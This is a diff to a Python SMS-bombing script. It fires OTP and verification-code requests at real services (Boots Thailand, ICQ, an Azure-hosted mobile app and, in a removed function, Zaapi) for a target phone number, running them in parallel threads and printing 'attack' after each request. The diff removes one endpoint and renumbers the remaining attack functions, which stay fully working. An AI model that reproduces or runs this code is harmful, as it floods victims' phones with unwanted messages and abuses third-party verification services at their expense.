@@ -39,15 +39,13 @@ def api2():
 		requests.post("https://store.boots.co.th/api/v1/guest/register/otp",json={"phone_number": phone})
 		print ("\033[91mattack") 
 		
-	def api3():
-		requests.post("https://api.zaapi.co/api/store/auth/otp/login",json={"phoneNumber":f"+66{phone}","namespace":"zaapi-buyers"},headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"})
-		print ("\033[91mattack")
+	
 		
-	def api4():
+	def api3():
 		requests.post("https://u.icq.net/api/v65/rapi/auth/sendCode", json={"reqId":"39816-1633012470","params":{"phone": phone,"language":"en-US","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}})
 		print ("\033[91mattack")
 		
-	def api5():
+	def api4():
 		requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
 		print ("\033[91mattack") 
 		
@@ -56,7 +54,7 @@ def api2():
 		threading.Thread(target=api2).start() 
 		threading.Thread(target=api3).start() 
 		threading.Thread(target=api4).start() 
-		threading.Thread(target=api5).start() 
+		
     
 		
 
